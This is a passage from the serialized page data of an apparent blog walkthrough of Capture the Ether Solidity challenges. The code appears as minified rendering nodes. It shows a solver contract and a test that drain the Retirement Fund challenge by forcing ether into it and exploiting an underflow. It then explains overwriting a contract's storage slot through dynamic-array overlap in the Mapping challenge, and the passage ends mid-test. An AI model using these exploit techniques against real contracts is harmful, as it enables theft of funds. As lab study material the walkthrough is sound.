transaction."}]},{type:a,value:m},{type:b,tag:L,props:{className:[N]},children:[{type:b,tag:c,props:{className:[aa]},children:[{type:a,value:"contracts\u002Fmath\u002Fsolvers\u002FRetirementFundSolver.sol"}]},{type:b,tag:O,props:{className:[P,aG]},children:[{type:b,tag:o,props:{},children:[{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aH}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aI}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:aJ}]},{type:b,tag:c,props:{className:[d,aK,B]},children:[{type:a,value:aL}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:_},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aM}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,am]},children:[{type:a,value:"RetirementFundSolver"}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:a,value:bb},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:"constructor"}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:"\n        owner "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:bH},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:U},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:cd}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:C}]},{type:a,value:" target"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aO}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:W}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:Q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:bJ},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:ac}]},{type:a,value:bb},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:"\"Access denied\""}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:W}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:Q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:aP},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:c$}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:bI}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:"\"Must have a value\""}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:az},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:cc}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:"target"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:m}]}]}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"We apply a basic protection to make sure that we're the only ones who can call the "},{type:b,tag:o,props:{},children:[{type:a,value:cd}]},{type:a,value:" method, but other than that it's a very simple contract. We then call this in our test and send 1 wei, causing "},{type:b,tag:o,props:{},children:[{type:a,value:"startBalance - address(this).balance"}]},{type:a,value:" to underflow to "},{type:b,tag:o,props:{},children:[{type:a,value:"(2**256)-1"}]},{type:a,value:" - significantly \u003E 0."}]},{type:a,value:m},{type:b,tag:L,props:{className:[N]},children:[{type:b,tag:c,props:{className:[aa]},children:[{type:a,value:"test\u002Fmath\u002Fretirement-fund-challenge.ts"}]},{type:b,tag:O,props:{className:[P,aT]},children:[{type:b,tag:o,props:{},children:[{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:X}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:ap},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:M}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:aq}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:X}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:ar},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:M}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:as}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:_},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:X}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:ap},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:M}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:aq}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:X}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:ar},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:M}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:as}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:_},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:aU}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:da}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:ab},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:aV}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:"\"should return true if we empty the retirement fund\""}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aW}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:aj},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:R},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bp}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:aX},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:R},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:at}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:ak},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:da}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:aY},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:aZ},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:au}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:Y},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:C},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:a_},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:av}]},{type:a,value:R},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:aw},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bq}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:br}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:Z},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ax}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:" Solver "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:R},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:at}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:"\"RetirementFundSolver\""}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:" solver "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:" Solver"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:au}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:db},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ax}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:db},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:cd}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:"challenge"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:C},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:a_},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:av}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:V}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:Z},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:a$}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:Y},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:cb}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bL}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:Z},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ah}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:ad},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:bM}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,bN]},children:[{type:a,value:ae}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:ab},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:m}]}]}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"A quick run shows that the test passes - we've cleared out the fund!"}]},{type:a,value:m},{type:b,tag:aC,props:{id:cp},children:[{type:b,tag:T,props:{href:cw,ariaHidden:ae,tabIndex:aD},children:[{type:b,tag:c,props:{className:[aE,aF]},children:[]}]},{type:a,value:bQ}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"This challenge shows us how important it is to understand exactly how the EVM stores data. We've covered overwriting storage addresses previously, but here we look in some depth at how arrays are stored, and how that can be abused if proper care isn't taken to sanitise user input. This contract has just 2 storage variables - isComplete, and a uint256 array."}]},{type:a,value:m},{type:b,tag:L,props:{className:[N]},children:[{type:b,tag:c,props:{className:[aa]},children:[{type:a,value:"contracts\u002Fmath\u002FMappingChallenge.sol"}]},{type:b,tag:O,props:{className:[P,aG]},children:[{type:b,tag:o,props:{},children:[{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aH}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aI}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:aJ}]},{type:b,tag:c,props:{className:[d,aK,B]},children:[{type:a,value:aL}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:_},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aM}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,am]},children:[{type:a,value:bQ}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:bk}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:" isComplete"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:a,value:dc},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ce}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:a,value:cf},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:a,value:S},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,ag]},children:[{type:a,value:"\u002F\u002F Expand dynamic array as needed"}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:cX}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:a,value:"map"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:dd},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:"\u003C="}]},{type:a,value:cf},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:"\n            map"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:a,value:dd},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:" key "},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:D}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,B]},children:[{type:a,value:V}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:"\n\n        map"},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:a,value:cg},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:S},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:"get"}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:a,value:cf},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:G}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:bi}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:bj}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,t]},children:[{type:a,value:K}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:F},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:bl}]},{type:a,value:dc},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:I}]},{type:a,value:cg},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:J}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:m}]}]}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"Now, as we've discussed before, EVM storage is basically just a gigantic map of uint256 keys to uint256 values... Which is exactly what this contract has implemented! Sounds like it's ripe for overwriting "},{type:b,tag:o,props:{},children:[{type:a,value:ah}]},{type:a,value:" with a value of our choice, as there will be a place at which these two overlap. What we need to do is figure out where exactly the overlap will occur, and then we should just be able to set the value by passing the correct index as the "},{type:b,tag:o,props:{},children:[{type:a,value:ce}]},{type:a,value:" method's "},{type:b,tag:o,props:{},children:[{type:a,value:cg}]},{type:a,value:" parameter and "},{type:b,tag:o,props:{},children:[{type:a,value:V}]},{type:a,value:" as the value."}]},{type:a,value:m},{type:b,tag:E,props:{},children:[{type:a,value:"When a dynamically sized array is defined as a storage variable, this only actually "},{type:b,tag:T,props:{href:"https:\u002F\u002Fdocs.soliditylang.org\u002Fen\u002Fv0.8.11\u002Finternals\u002Flayout_in_storage.html#mappings-and-dynamic-arrays",rel:[bd,be,bf],target:bg},children:[{type:a,value:"stores the length of the array in the storage variable"}]},{type:a,value:". The contents of the array is stored in sequential addresses, starting at "},{type:b,tag:o,props:{},children:[{type:a,value:"keccak256(slot)"}]},{type:a,value:". Our "},{type:b,tag:o,props:{},children:[{type:a,value:"uint256[] map"}]},{type:a,value:" is stored in slot 1, so we can calculate the key at which the array overlaps back to overwrite slot 0 by calculating "},{type:b,tag:o,props:{},children:[{type:a,value:"(2**256)-keccak256(0x1)"}]},{type:a,value:". Our test for this looks as follows:"}]},{type:a,value:m},{type:b,tag:L,props:{className:[N]},children:[{type:b,tag:c,props:{className:[aa]},children:[{type:a,value:"test\u002Fmath\u002Fmapping-challenge.ts"}]},{type:b,tag:O,props:{className:[P,aT]},children:[{type:b,tag:o,props:{},children:[{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:X}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:ap},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:M}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:aq}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:m},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:X}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:ar},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:s}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:M}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:as}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:_},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:aU}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:de}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:ab},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:aV}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:"\"should return true if we force the value of isComplete to be 1\""}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:v}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:aW}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:k}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:r}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:aX},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:R},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:at}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,z]},children:[{type:a,value:de}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:aY},{type:b,tag:c,props:{className:[d,n]},children:[{type:a,value:x}]},{type:a,value:f},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:aZ},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:au}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:q},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:y}]},{type:a,value:Z},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:l}]},{type:b,tag:c,props:{className:[d,k]},children:[{type:a,value:ax}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:h}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:i}]},{type:b,tag:c,props:{className:[d,e]},children:[{type:a,value:j}]},{type:a,value:w},{type:b,tag:c,props:{className:[d,g]},children:[{type:a,value:H}]},{type:a,value:" slot 